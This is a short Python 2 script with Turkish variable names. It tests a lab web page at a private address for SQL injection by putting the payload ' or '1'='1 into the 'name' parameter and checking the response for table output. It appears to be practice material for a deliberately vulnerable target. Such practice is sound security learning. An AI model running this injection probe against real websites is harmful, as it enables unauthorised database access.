import requests
url="http://192.168.43.161/sqli/example1.php?name=root"
indis=url.find("=")
print indis
url=url[:indis+1]+"' or '1'='1"
sonuc=requests.get(url)
#print sonuc.content
if "<td>" in sonuc.content:
    print "[+]SQLi var:","' or '1'='1"